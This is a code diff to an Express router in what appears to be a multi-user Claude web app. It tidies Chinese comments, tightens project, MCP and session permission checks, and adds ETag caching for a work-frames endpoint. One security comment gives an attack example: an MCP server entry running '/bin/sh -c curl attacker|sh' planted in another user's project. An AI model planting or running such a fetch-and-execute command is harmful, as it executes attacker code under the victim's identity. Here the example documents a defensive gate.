@@ -1,3 +1,5 @@
+import { createHash } from 'node:crypto';
+
 import express, { type Request, type Response } from 'express';
 
 import {
@@ -65,9 +67,8 @@ const log = createLogger('providers');
 /**
  * 自定义网关的主机名,给前端决定要不要提示"卡片描述仅供参考"。
  * 只暴露 host,不暴露完整 URL —— 路径里可能带租户 id 之类不该给所有登录用户看的东西。
+ * 先读 settings.json 的 env、进程环境兜底:网关地址往往只写在 settings.json 里。
  */
-// hq:改读 settings.json 的 env(进程环境兜底)—— 原来只看进程环境,而生产的网关只写在 settings.json 里,
-// 于是 /models 面板上「经由网关 xxx」那一行从来不显示。
 const readGatewayHost = async (): Promise<string | null> => {
   try {
     return (await describeDefaultGateway()).host;
@@ -76,14 +77,14 @@ const readGatewayHost = async (): Promise<string | null> => {
   }
 };
 
-/** hq:这次请求是谁 —— 模型表、闸口按人。 */
+/** 这次请求是谁:模型表、闸口按人。 */
 const requestModelViewer = (req: Request): ModelViewer => {
   const user = (req as Request & { user?: { id?: number; username?: string } }).user;
   return modelViewerFor(typeof user?.id === 'number' ? user.id : null, user?.username ?? null);
 };
 
 const router = express.Router();
-// hq:模型网关与 key(root 管共享网关;每个人管自己的 key / 私有网关 / 私有模型)
+// 模型网关与 key(root 管共享网关;每个人管自己的 key / 私有网关 / 私有模型)
 router.use(claudeGatewaysRouter);
 
 const readPathParam = (value: unknown, name: string): string => {
@@ -457,28 +458,18 @@ router.get(
     const bypassCache = parseOptionalBooleanQuery(req.query.bypassCache, 'bypassCache') ?? false;
     const result = await providerModelsService.getProviderModels(provider, { bypassCache });
     /*
-     * hq:**按人**:目录条目只留他看得见的(「可用人员」),加上他的私有模型,每条标上能不能用(有没有 key)。
-     * 全量定义仍走 providerModelsService(缓存与并发去重不变),这里只在出口按人筛 / 标。
+     * 按人:目录条目只留他看得见的(「可用人员」),加上他的私有模型,每条标上能不能用(有没有 key)。
+     * 全量定义仍走 providerModelsService(缓存与并发去重),这里只在出口按人筛 / 标。
      */
     const models = provider === 'claude' ? modelsDefinitionFor(requestModelViewer(req)) : result.models;
     res.json(createApiSuccessResponse({ provider, models, cache: result.cache }));
   }),
 );
 
-/**
- * 别名 → 真实模型的实测结果。
- *
- * /models 卡片上的描述("Sonnet 4.6 · $3/$15")是 Anthropic 官方口径;部署把
- * ANTHROPIC_BASE_URL 指向自己的网关时,实际由哪个模型来答是网关在请求时决定的,
- * 没有任何接口可查。GET 回缓存的实测值;POST 逐别名各发一次最小请求现测。
- *
- * `gatewayHost` 让前端知道该不该提醒"描述仅供参考":官方 API 下卡片文案本来
- * 就是对的,不需要打扰。
- */
-/** hn:别名组的值(default / sonnet / opus … 含 [1m] 变体)。 */
+/** 别名组的值(default / sonnet / opus … 含 [1m] 变体)。 */
 const aliasGroupValues = (): string[] => CLAUDE_FALLBACK_MODELS.OPTIONS.map((option) => option.value);
 
-/** hn(B2):入口处的模型前置检查 —— 不在目录里 / 下架了回 400 MODEL_NOT_ALLOWED。 */
+/** 入口处的模型前置检查:不在目录里 / 下架了回 400 MODEL_NOT_ALLOWED。 */
 const assertModelAllowedForRequest = (model: string | null | undefined, viewer?: ModelViewer | null): void => {
   try {
     claudeModelCatalog.assertAllowed(model, viewer);
@@ -554,7 +545,7 @@ router.put(
     }
 
     const written = await writeModelConfig(update);
-    // hn:此前一直没记审计 —— 改别名映射会改变所有人的子代理与 default 档实际用的模型。
+    // 记审计:改别名映射会改变所有人的子代理与 default 档实际用的模型。
     const actor = readSkillActor(req);
     auditLogDb.record({
       userId: actor.id,
@@ -567,7 +558,7 @@ router.put(
   }),
 );
 
-/* ----------------- hn(B2):模型目录(root) ----------------- */
+/* ----------------- 模型目录(root) ----------------- */
 
 /** 目录错误 → AppError(带 code / 状态码)。 */
 const asCatalogError = (error: unknown): unknown => (
@@ -606,7 +597,7 @@ router.get(
 );
 
 /**
- * ho(hq-4):每模型回合健康度(最近 N 天,默认 7):回合数、失败率、失败原因、首字延迟 p50 / p90。
+ * 每模型回合健康度(最近 N 天,1–30,默认 7):回合数、失败率、失败原因、首字延迟 p50 / p90。
  * 模型名是网关上的真实名字(别名会话记的是它解析到的那个)。root 才看。
  */
 router.get(
@@ -619,7 +610,7 @@ router.get(
   }),
 );
 
-/** ho:子代理模型(全局一份;没设 = 跟随主模型)。 */
+/** 子代理模型(全局一份;没设 = 跟随主模型)。 */
 router.get(
   '/:provider/model-catalog/subagent',
   asyncHandler(async (req: Request, res: Response) => {
@@ -722,7 +713,7 @@ router.post(
     const entry = claudeModelCatalog.get(id);
     if (!entry) throw new AppError('这条目录条目不存在', { code: 'NOT_FOUND', statusCode: 404 });
     /*
-     * hq:按条目挂的网关测,key 按 root 自己会用的那把(个人 key > 网关默认 key > settings.json)。
+     * 按条目挂的网关测,key 按 root 自己会用的那把(个人 key > 网关默认 key > settings.json)。
      * 没有可用的 key 时不起 CLI,把原因当成这次实测的结果记下来。
      */
     let gateway;
@@ -754,13 +745,23 @@ router.post(
   }),
 );
 
+/**
+ * 别名 → 真实模型的实测结果。
+ *
+ * /models 卡片上的描述("Sonnet 4.6 · $3/$15")是 Anthropic 官方口径;部署把
+ * ANTHROPIC_BASE_URL 指向自己的网关时,实际由哪个模型来答是网关在请求时决定的,
+ * 没有任何接口可查。GET 回缓存的实测值;POST 逐别名各发一次最小请求现测。
+ *
+ * `gatewayHost` 让前端知道该不该提醒"描述仅供参考":官方 API 下卡片文案本来
+ * 就是对的,不需要打扰。
+ */
 router.get(
   '/:provider/model-mappings',
   asyncHandler(async (req: Request, res: Response) => {
     parseProvider(req.params.provider); // 目前只有 claude,守卫同其它路由
     const meta = await readModelMappingsMeta();
     // 配置层映射:每次现读 settings.json —— 改完配置这里立即是新值,不依赖实测。
-    // hn:只给别名组 —— 目录条目的真名就是它自己,不需要映射;全量返回会把每条目录模型都查一遍。
+    // 只给别名组:目录条目的真名就是它自己,不需要映射;全量返回会把每条目录模型都查一遍。
     const configMappings = await readAliasConfigMappings(aliasGroupValues());
     res.json(createApiSuccessResponse({
       mappings: meta.mappings,
@@ -779,8 +780,8 @@ router.post(
   asyncHandler(async (req: Request, res: Response) => {
     parseProvider(req.params.provider);
     /*
-     * hn:收紧为 root,且只探别名组。此前任何登录用户都能触发,而它对每个 OPTIONS 值各起一次 CLI、
-     * 每次超时 60 秒 —— 目录变长之后就是 N 次串行 CLI 调用。目录条目各有自己的单条实测。
+     * 只许 root,且只探别名组:每个值都要串行起一次 CLI(每次最长 60 秒),不能让任何登录用户
+     * 随手触发,也不该随目录变长而变长。目录条目各有自己的单条实测。
      */
     assertRootForModelConfig(req);
     const aliases = aliasGroupValues();
@@ -799,19 +800,16 @@ router.post(
 );
 
 /**
- * The session's effective model.
- *
- * Exists so the composer can show which model is actually running. Until this
- * route, the only way to find out was to run /models and read the modal, which
- * meant a switch had no visible effect anywhere once that modal closed.
+ * The session's effective model, so the composer can show which model is
+ * actually running (a switch made in /models stays visible after the modal closes).
  */
 router.get(
   '/:provider/sessions/:sessionId/active-model',
   asyncHandler(async (req: Request, res: Response) => {
     const provider = parseProvider(req.params.provider);
     const sessionId = parseSessionId(req.params.sessionId);
-    // 兄弟路由(delete/rename/messages)都过这道门,这两条当初漏了 —— 读会泄露
-    // 别人会话的当前模型,写能替别人的会话改下一轮用的模型。
+    // 与 delete/rename/messages 同一道门:不过门的话,读会泄露别人会话的当前模型,
+    // 写能替别人的会话改下一轮用的模型。
     sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
     const active = await providerModelsService.getCurrentActiveModel(provider, sessionId);
     res.json(createApiSuccessResponse({ provider, sessionId, model: active.model, source: active.source ?? null }));
@@ -825,8 +823,8 @@ router.post(
     const sessionId = parseSessionId(req.params.sessionId);
     sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
     const payload = parseChangeActiveModelPayload(req.body);
-    // hn(B2):前置检查 —— 只许别名组 / 目录里上架的(真正的闸口在 claude-sdk 的四条路径上)。
-    // hq:按人(「可用人员」/ 私有模型)
+    // 前置检查:只许别名组 / 目录里上架的,并按人判(「可用人员」/ 私有模型);
+    // 真正的闸口在 claude-sdk 发起回合的各条路径上。
     assertModelAllowedForRequest(payload.model, requestModelViewer(req));
     const result = await providerModelsService.changeActiveModel(provider, {
       ...payload,
@@ -842,7 +840,7 @@ router.get(
   asyncHandler(async (req: Request, res: Response) => {
     const provider = parseProvider(req.params.provider);
     const workspacePath = readOptionalQueryString(req.query.workspacePath);
-    // hl(09-24 P2-16):带 workspacePath 时与 MCP 同门(路径合法 + 项目可见)—— 此前能列任意目录下
+    // 带 workspacePath 时与 MCP 同门(路径合法 + 项目可见),否则能列出任意目录下
     // `.claude/skills` 的名称 / 描述 / 路径。不带时只列全局技能库,不需要项目归属。
     if (workspacePath) {
       await assertViewerMayCreateSessionAt(readRequestViewer(req), workspacePath);
@@ -855,15 +853,10 @@ router.get(
 /**
  * 技能的装与卸都记审计。
  *
- * ## 为什么这两条要单独留痕
- *
- * 技能目录是**服务进程自己的 home**,一台机器上所有用户共用同一份。它不像项目
- * 那样有 owner —— 这是产品设计(共享技能库),这里不改。但代价是:B 卸掉 A 装的
- * 技能之后,A 的所有会话行为会**静默**改变 —— 某个 `/xxx` 命令突然不存在,或者
- * 同名技能换成了另一份内容 —— 而 A 收不到任何通知。
- *
- * 在 fd 之前,这件事**不留任何痕迹**:审计事件表里一个 skill 相关的都没有,
- * 事后没人能回答"这技能谁卸的、什么时候卸的"。所以补的是可追溯性,不是权限。
+ * 技能目录是服务进程自己的 home,一台机器上所有用户共用同一份,不像项目那样有 owner
+ * (共享技能库是产品设计)。代价是:B 卸掉 A 装的技能之后,A 的会话行为会静默改变 ——
+ * 某个 `/xxx` 命令突然不存在,或者同名技能换成了另一份内容,而 A 收不到任何通知。
+ * 审计补的是可追溯性("这技能谁卸的、什么时候卸的"),不是权限。
  *
  * 记在路由层而不是 service 层,是因为"谁在操作"只有 req 上有;service 被定时
  * 任务之类的非 HTTP 路径调用时本来就没有 actor。
@@ -873,7 +866,7 @@ const readSkillActor = (req: Request): { id: number | null; username: string | n
   return { id: user?.id ?? null, username: user?.username ?? null };
 };
 
-/** gk:删除类操作的操作者(Viewer + ip + user-agent),只为审计与回收站里的"谁删的"。 */
+/** 删除类操作的操作者(Viewer + ip + user-agent),只为审计与回收站里的"谁删的"。 */
 const readSessionActor = (req: Request): SessionActor => {
   const viewer = readRequestViewer(req);
   return {
@@ -884,7 +877,7 @@ const readSessionActor = (req: Request): SessionActor => {
   };
 };
 
-/** gk:最近删除里的立即清除只给 root。 */
+/** 最近删除里的立即清除只给 root。 */
 const assertRootForTrashPurge = (req: Request): void => {
   const user = (req as Request & { user?: { isRoot?: boolean } }).user;
   if (user?.isRoot !== true) {
@@ -942,44 +935,17 @@ router.delete(
 );
 
 /**
- * MCP 的三条路由:`workspacePath` 必须过和建会话同一道门。
+ * MCP 路由的门,读和写分开。
  *
- * ## 之前是完全没有门
- *
- * `workspacePath` 直接 `path.resolve()` 之后拼 `.mcp.json` 写盘,既不校验路径合法,
- * 也不问调用者看不看得见这个项目。后果不是读泄漏,是**在别人的项目里种命令**:
- *
- *   POST /:provider/mcp/servers
- *   { name, transport:"stdio", command:"/bin/sh", args:["-c","curl attacker|sh"],
- *     scope:"project", workspacePath:"/别人的项目" }
- *
- * 受害者下次在那个项目里跑 Claude,这条 stdio server 就会被拉起,命令以他的身份执行。
- *
- * ## `user` scope 收成 root-only
- *
- * `scope:"user"` 写的是 `~/.claude.json` —— 服务进程的家目录,**对包括 root 在内的
- * 每个人生效**。这不是"某个项目的配置",是全机配置。普通用户不该能写它。
- *
- * ## 为什么复用 assertViewerMayCreateSessionAt
- *
- * 它就是"路径合法 + 项目可见"这两道门的现成实现,已经有 100% 覆盖的测试,而且
- * 对两种失败一律返回同形的 404(不给一个"这个路径存不存在"的探针)。
- * 再写一份判据只会漂 —— 这个仓库为此吃过亏(见 eo 轮的 project-permissions.service)。
- *
- * `workspacePath` 为空时不校验:那表示"不针对某个项目",此时只有 user scope 有意义,
- * 而 user scope 已经被下面的 root 判定挡住了。
- */
-/**
- * F03:**读和写分成两道门。**
- *
- * fj 把 `user` 作用域收成 root-only,但那道门读写一起挡 —— 而前端的 MCP 页面
- * 对所有人都会拉一次 `scope=user`,于是普通用户打开那个页面就看到一条报错。
- * 而"这台机器上装了哪些 MCP server"本身不是秘密:它决定了你的会话能调用什么。
- *
- * 真正不能给的是里面的 `env` / `headers` —— API key 和 bearer token 放在那里。
- * 所以读这道门放行,由 `redactMcpSecrets` 把值打掉(见那个模块的说明)。
- *
- * 非 user 作用域读写同一道门:它要过项目归属检查,而那正是"能读到的 = 能写的"。
+ * - 项目级(非 user 作用域):`workspacePath` 必须过和建会话同一道门(assertViewerMayCreateSessionAt,
+ *   路径合法 + 项目可见,两种失败一律返回同形的 404,不给"这个路径存不存在"的探针)。不拦的话,
+ *   任何人都能往别人项目的 `.mcp.json` 里种一条 stdio server(如 `command:"/bin/sh",
+ *   args:["-c","curl attacker|sh"]`),受害者下次在那个项目里跑 Claude 时命令以他的身份执行。
+ *   判据只能有一份,所以复用而不另写。读写同一道门:能读到的 = 能写的。
+ * - `scope:"user"` 写的是 `~/.claude.json`(服务进程的家目录),对包括 root 在内的每个人生效,
+ *   所以写只给 root。读放行:前端的 MCP 页面对所有人都会拉一次 `scope=user`,"这台机器上装了
+ *   哪些 MCP server"本身不是秘密;真正不能给的是 `env` / `headers` 里的 API key 与 bearer token,
+ *   由 `redactMcpSecrets` 打码(见那个模块的说明)。
  */
 async function assertMayReadMcpScope(
   req: Request,
@@ -1007,14 +973,12 @@ async function assertMayTouchMcpScope(
     }
     return;
   }
-  /**
-   * fj:非 user 作用域**必须**给出 workspacePath,而且必须过归属门。
+  /*
+   * 非 user 作用域必须给出 workspacePath,而且必须过归属门。
    *
-   * 原来是"给了才查"。而 `resolveWorkspacePath` 在没给时回落到
-   * **`process.cwd()` —— 服务进程自己的工作目录**,scope 又默认 `'project'`,
-   * 于是任何登录用户不带这两个参数就能往 Prism 安装目录里写 `.mcp.json`,
-   * 一次归属校验都不过。MCP server 配置是"这段对话能调用哪些外部进程"的清单,
-   * 这个洞的下游就是执行。
+   * MCP provider 的 `resolveWorkspacePath` 在没给时回落到 `process.cwd()`(服务进程自己的工作目录),
+   * scope 又默认 `'project'`;不拦的话,任何登录用户不带这两个参数就能往 Prism 安装目录里写
+   * `.mcp.json`,而 MCP server 配置决定这段对话能调用哪些外部进程。
    *
    * 明确拒绝而不是替它挑一个默认值:猜错默认值的代价是往错误的地方写配置,
    * 而调用方本来就知道自己在操作哪个项目。
@@ -1049,14 +1013,10 @@ router.get(
       return;
     }
 
-    /**
-     * F03:**不带 scope 的那条路此前把三组原样返回。**
-     *
-     * 过的只是"这个项目看得见吗",而返回里带着 `user` 作用域 ——
-     * 也就是 `~/.claude.json`,全机配置,`env`/`headers` 里正是 API key 和
-     * bearer token。任何登录用户读一次就全拿到了。
-     *
-     * 现在按作用域逐组决定要不要打码,和显式 scope 那条路同一套规则。
+    /*
+     * 不带 scope 时三组一起返回,其中含 `user` 作用域(`~/.claude.json`,全机配置,
+     * `env`/`headers` 里是 API key 与 bearer token)。按作用域逐组决定要不要打码,
+     * 和显式 scope 那条路同一套规则。
      */
     const groupedServers = await providerMcpService.listProviderMcpServers(provider, { workspacePath });
     const scopes = Object.fromEntries(
@@ -1096,11 +1056,6 @@ router.delete(
   }),
 );
 
-// `POST /mcp/servers/global` was removed: with Claude the only provider it wrote
-// to exactly the same file as the per-provider add route above, minus `local`
-// scope — the same feature with a hole in it. (Its old consumer, browser-use,
-// is gone too.)
-
 router.get(
   '/capabilities',
   asyncHandler(async (_req: Request, res: Response) => {
@@ -1133,12 +1088,12 @@ router.post(
     const body = (req.body ?? {}) as Record<string, unknown>;
     const provider = parseProvider(body.provider);
     const projectPath = typeof body.projectPath === 'string' ? body.projectPath : '';
-    // dz:路径合法(挡越界)+ 项目可见(挡越权),与任务路由同一道门。
-    // 没有它,任何登录用户 POST 一个 projectPath:"/" 就成了根目录项目的 owner
-    // (实测),文件树、聊天 cwd 随之全盘放开。见 session-project-path-guard。
+    // 路径合法(挡越界)+ 项目可见(挡越权),与任务路由同一道门。
+    // 没有它,任何登录用户 POST 一个 projectPath:"/" 就成了根目录项目的 owner,
+    // 文件树、聊天 cwd 随之全盘放开。见 session-project-path-guard。
     await assertViewerMayCreateSessionAt(readRequestViewer(req), projectPath);
-    // 建会话的人就是项目的 owner。不传的话项目 owner 为 NULL,而 NULL 的语义是
-    // "公共项目" —— 新会话所在的目录会直接出现在所有人的侧栏里。
+    // 建会话的人成为新项目的 owner(项目已存在时 owner 不变)。不传的话新项目就是无主的:
+    // 不在公共目录下时连创建者自己都看不见,在公共目录下则所有人都看得见。
     const ownerUserId = typeof req.user?.id === 'number' ? req.user.id : null;
     const result = sessionsService.createAppSession(provider, projectPath, ownerUserId);
     res.status(201).json(createApiSuccessResponse(result));
@@ -1156,8 +1111,8 @@ router.get(
 router.get(
   '/sessions/archived',
   asyncHandler(async (req: Request, res: Response) => {
-    // E10:分页 + 可见性下推 SQL。`sessions` 字段名不变,老前端照常拿到数组;
-    // 新增的 total/hasMore 让界面能说清"还有多少条没列出来"。
+    // 分页 + 可见性下推 SQL。`sessions` 是这一页的数组;total/hasMore 让界面能说清
+    // "还有多少条没列出来"。
     const page = sessionsService.listArchivedSessions(readRequestViewer(req), {
       limit: parseOptionalCountQuery(req.query.limit, 'limit'),
       offset: parseOptionalCountQuery(req.query.offset, 'offset'),
@@ -1167,7 +1122,7 @@ router.get(
 );
 
 /**
- * F8:批量归档 / 恢复 / 删除。逐条鉴权(看不见的静默跳过,不报错 —— 报错等于
+ * 批量归档 / 恢复 / 删除。逐条鉴权(看不见的、看得见但无权操作的都静默跳过,不报错 —— 报错等于
  * 告诉调用方那个 id 存在),一条失败不中断其余,最后给一份账。
  *
  * 放在 `/sessions/:sessionId` 之前:否则 `bulk` 会被当成一个 sessionId。
@@ -1203,7 +1158,7 @@ router.post(
 );
 
 /**
- * F8:清空回收站 —— 永久删除**当前访问者看得见的**归档会话。
+ * 清空归档:永久删除当前访问者看得见的归档会话(进最近删除;看得见但无权永久删除的跳过并计数)。
  * `?olderThanDays=N` 只清超过 N 天的(给"保留最近一周"这种用法)。
  */
 router.delete(
@@ -1219,7 +1174,7 @@ router.delete(
 );
 
 /**
- * gk:最近删除(会话回收站)。放在 `/sessions/:sessionId` 之前,否则 `trash` 会被当成一个 sessionId。
+ * 最近删除(会话回收站)。放在 `/sessions/:sessionId` 之前,否则 `trash` 会被当成一个 sessionId。
  *   GET    /sessions/trash                 列表(分页,最近删的在前)
  *   POST   /sessions/trash/:id/restore     恢复(root / 项目 owner / 删除者)
  *   DELETE /sessions/trash/:id             立即清除(root)
@@ -1261,7 +1216,8 @@ router.delete(
     const viewer = readRequestViewer(req);
     sessionsService.assertViewerCanSeeSession(sessionId, viewer);
     const force = parseOptionalBooleanQuery(req.query.force, 'force') ?? false;
-    // gk:永久删除只给 root / 项目 owner;hl(动态 P2-6):归档同门(多一维会话发起人)。
+    // 永久删除与归档 / 还原同一道门(canViewerManageSession:root、项目 owner、会话发起人),
+    // 403 的说明按动作分开写。
     if (force) sessionsService.assertViewerMayPermanentlyDelete(sessionId, viewer);
     else sessionsService.assertViewerMayArchiveOrRestore(sessionId, viewer, 'archive');
     const deletedFromDisk = parseOptionalBooleanQuery(req.query.deletedFromDisk, 'deletedFromDisk') ?? force;
@@ -1279,7 +1235,7 @@ router.post(
   '/sessions/:sessionId/restore',
   asyncHandler(async (req: Request, res: Response) => {
     const sessionId = parseSessionId(req.params.sessionId);
-    // hl(动态 P2-6):还原与归档同门。
+    // 还原与归档同一道门。
     sessionsService.assertViewerMayArchiveOrRestore(sessionId, readRequestViewer(req), 'restore');
     const result = sessionsService.restoreSessionById(sessionId);
     res.json(createApiSuccessResponse(result));
@@ -1314,8 +1270,7 @@ router.get(
         statusCode: 400,
       });
     }
-    // F12:默认不带工具过程(多数导出是给人读的);要排查"它当时改了哪个文件"
-    // 时才打开,而不是替谁做决定。
+    // 默认不带工具过程(多数导出是给人读的);要排查"它当时改了哪个文件"时再打开。
     const includeTools = parseOptionalBooleanQuery(req.query.includeTools, 'includeTools') ?? false;
 
     const history = await sessionsService.fetchHistory(sessionId, { limit: null, offset: 0 });
@@ -1326,11 +1281,11 @@ router.get(
       {
         title,
         sessionId,
-        // F38:原生 id 一起带出去 —— transcript / 检查点都按它组织。
+        // 原生 id 一起带出去:transcript / 检查点都按它组织。
         providerSessionId: dbSession?.provider_session_id ?? null,
         exportedAt: new Date().toISOString(),
-        // fj:显式映射,不再用 `as` 强转 —— 强转正是让 `toolUseId`/`toolName`
-        //     这类字段名漂移在编译期完全静默的原因(导出里恒为 null)。
+        // 逐字段显式映射,不整条 `as` 强转:强转会让 `toolUseId`/`toolName` 这类字段名
+        // 漂移在编译期完全静默(导出里恒为 null)。
         messages: history.messages.map((message): ExportableMessage => ({
           kind: message.kind,
           role: (message as { role?: 'user' | 'assistant' }).role,
@@ -1341,7 +1296,7 @@ router.get(
           toolInput: (message as { toolInput?: unknown }).toolInput,
           toolId: (message as { toolId?: string }).toolId,
           isError: (message as { isError?: boolean }).isError,
-          // F38:附件清单。`images` 是归一化消息上的既有字段,此前导出完全不看它。
+          // 附件清单,取自归一化消息上的 `images` 字段。
           attachments: Array.isArray((message as { images?: unknown[] }).images)
             ? ((message as { images: unknown[] }).images).map((image) => {
               const record = (image && typeof image === 'object' ? image : {}) as Record<string, unknown>;
@@ -1409,30 +1364,57 @@ router.get(
   }),
 );
 
+/** 响应体的摘要,作 work-frames 的强 ETag。 */
+function workFramesEtag(body: string): string {
+  return `"wf-${createHash('sha1').update(body).digest('base64url')}"`;
+}
+
 /**
- * dq:右侧工作面板的数据帧(任务清单 + 产出文件原料)。
- * 全量历史滤出 TodoWrite/TaskCreate/TaskUpdate/Write 工具帧;折叠在前端做。
+ * If-None-Match 里有没有这个 ETag(逗号分隔的列表;按弱比较,`W/` 前缀不影响)。
+ *
+ * 不走 Express 的 `req.fresh`:按 Fetch 规范,浏览器给手动带 If-None-Match 的 fetch 补上
+ * `Cache-Control: no-cache`,`fresh` 见到它一律判为过期,304 永远不会发生。这里的 304 只回应
+ * 前端显式带来的那个 ETag。
+ */
+function ifNoneMatchHits(header: string | undefined, etag: string): boolean {
+  if (!header) return false;
+  return header.split(',').some((entry) => entry.trim().replace(/^W\//, '') === etag);
+}
+
+/**
+ * 右侧工作面板的数据帧(任务清单 + 产出文件原料)。
+ * 全量历史滤出 TodoWrite/TaskCreate/TaskUpdate/Write 工具帧,只带折叠会读的字段;折叠在前端做。
+ *
+ * 带 ETag(整份响应体的摘要):前端每个回合结束、回滚之后都会重取,带上次的 ETag 来,
+ * 内容没变就回 304,不再下发、前端也不再重折。摘要按响应体算而不用显示日志指纹:skillSurveys
+ * 跟着反馈记录和个人开关变,老会话走 transcript 回放时也没有日志指纹。
+ * `/api` 统一的 `Cache-Control: no-store` 不动:浏览器不缓存这份响应,304 只发给前端自己带着
+ * ETag 来问的那一次,不会把缓存里的旧响应头合并回来。
  */
 router.get(
   '/sessions/:sessionId/work-frames',
   asyncHandler(async (req: Request, res: Response) => {
     const sessionId = parseSessionId(req.params.sessionId);
     sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
-    // ec:dw 给 collectWorkFrames 加了 `truncated`(帧数触顶、较早的帧未下发),
-    // 前端 useSessionWorkFrames 也接了 —— 但这里当时只透传了两个字段,提示永远
-    // 亮不起来。三个字段一起下发。
-    // ej:多带一个 turnOutputs(助手回答 id → 这一轮写出的文件)。对话正文下面
-    // 那张产出卡直接读它 —— 由服务端从全量日志算好、随会话一次到达,不再由前端
-    // 从"当前加载到的窗口"现推(那会随历史补齐而变)。
+    // `truncated`:帧数触顶、较早的帧未下发,前端 useSessionWorkFrames 据此提示。
+    // turnOutputs(助手回答 id → 这一轮写出的文件)给对话正文下面的产出卡直接读:由服务端
+    // 从全量日志算好、随会话一次到达,不由前端从"当前加载到的窗口"现推(那会随历史补齐而变)。
     const { frames, revertedPaths, truncated, turnOutputs, userTurns } = await sessionsService.fetchWorkFrames(sessionId);
-    // gy:调过 skill 的回合结束后的「效果如何」卡 —— 由服务端按显示日志算,不存"已弹出"状态;
+    // 调过 skill 的回合结束后的「效果如何」卡 —— 由服务端按显示日志算,不存"已弹出"状态;
     // 刷新、换设备结果一致。前端每回合结束都会重取这个接口,所以不需要单独的实时帧。
     const skillSurveys = await computeSkillSurveys(sessionId, req);
-    res.json(createApiSuccessResponse({ frames, revertedPaths, turnOutputs, truncated: truncated === true, skillSurveys, userTurns: userTurns ?? 0 }));
+    const body = JSON.stringify(createApiSuccessResponse({ frames, revertedPaths, turnOutputs, truncated: truncated === true, skillSurveys, userTurns: userTurns ?? 0 }));
+    const etag = workFramesEtag(body);
+    res.setHeader('ETag', etag);
+    if (ifNoneMatchHits(req.headers['if-none-match'], etag)) {
+      res.status(304).end();
+      return;
+    }
+    res.type('application/json').send(body);
   }),
 );
 
-/** gy:从账号同步的界面偏好里读「技能效果询问」开关;读不到一律当开着。 */
+/** 从账号同步的界面偏好里读「技能效果询问」开关;读不到一律当开着。 */
 export function readSkillSurveyEnabled(settings: Record<string, unknown> | null | undefined): boolean {
   const values = (settings as { values?: Record<string, unknown> } | null | undefined)?.values;
   const raw = values?.uiPreferences;
@@ -1446,7 +1428,7 @@ export function readSkillSurveyEnabled(settings: Record<string, unknown> | null 
 }
 
 /**
- * gy:效果调查卡的判定入口。显示日志 → 候选(调过 Skill 且我发起的网页回合)→ 抽样与三道闸。
+ * 效果调查卡的判定入口。显示日志 → 候选(调过 Skill 且我发起的网页回合)→ 抽样与三道闸。
  * 关掉了询问(`user_ui_settings.skillSurveyEnabled === false`)或没登录 → 空。
  */
 async function computeSkillSurveys(sessionId: string, req: Request) {
@@ -1473,7 +1455,7 @@ async function computeSkillSurveys(sessionId: string, req: Request) {
 }
 
 /**
- * gy:用户对一条回答的反馈 —— 👍/👎(vote)与效果调查卡(survey)。
+ * 用户对一条回答的反馈:点赞 / 点踩(vote)与效果调查卡(survey)。
  *
  * 可见性沿用会话可见性(看得见就能投);一人一条一票,改票 upsert。
  * `project_id` 从会话所属项目取,按项目切数据时不必回表。
@@ -1543,15 +1525,15 @@ router.post(
     }
     const parsed = parseFeedbackBody(req.body);
     /*
-     * hl(09-24 P2-21):**messageId 必须是这个会话里的一条助手回答**,skill 由服务端从这一轮的
-     * Skill 工具帧反查;客户端自报的值只在服务端查不到时才用(显示日志被裁过 / 老会话)。
-     * 此前两者都不核对:能看到会话的人可以给任意技能伪造任意多条评价,污染训练数据。
-     * 显示日志为空的会话(磁盘发现的老会话)放行 —— 那类会话本来就不进训练。
+     * messageId 必须是这个会话里的一条助手回答,skill 由服务端从这一轮的 Skill 工具帧反查;
+     * 客户端自报的值只在服务端查不到时才用(显示日志被裁过 / 老会话)。不核对的话,能看到会话的人
+     * 可以给任意技能伪造任意多条评价,污染训练数据。显示日志为空的会话(磁盘发现的老会话)放行:
+     * 那类会话本来就不进训练。
      */
     const displayLog = sessionMessagesDb.listForSession(sessionId);
     const target = displayLog.length > 0 ? resolveFeedbackTarget(displayLog, messageId) : null;
-    // hl 复核:日志被裁剪过(最早那批被物理删掉)时,查不到可能只是因为那条回答在被裁掉的
-    // 前半段 —— 页面是从 transcript 回放出来的,用户照样看得见、点得了 👎。这时不 404,
+    // 日志被裁剪过(最早那批被物理删掉)时,查不到可能只是因为那条回答在被裁掉的前半段 ——
+    // 页面是从 transcript 回放出来的,用户照样看得见、点得了点踩。这时不 404,
     // 回落到客户端自报的 skill(与"服务端查不到才用客户端值"的口径一致)。
     if (target && !target.found && !sessionMessagesDb.isTrimmed(sessionId)) {
       throw new AppError('这条消息不属于该会话', { code: 'FEEDBACK_MESSAGE_NOT_IN_SESSION', statusCode: 404 });
@@ -1603,7 +1585,7 @@ router.post('/search/ticket', (req: Request, res: Response) => {
   if (viewer?.id == null) {
     return res.status(401).json({ error: 'Not authenticated' });
   }
-  // hj:带上签发时的 token_version,消费时比对(见 sse-tickets.js)。
+  // 带上签发时的 token_version,消费时比对(见 sse-tickets)。
   return res.json({ ticket: issueSseTicket(viewer.id, viewer.token_version ?? 0) });
 });
 
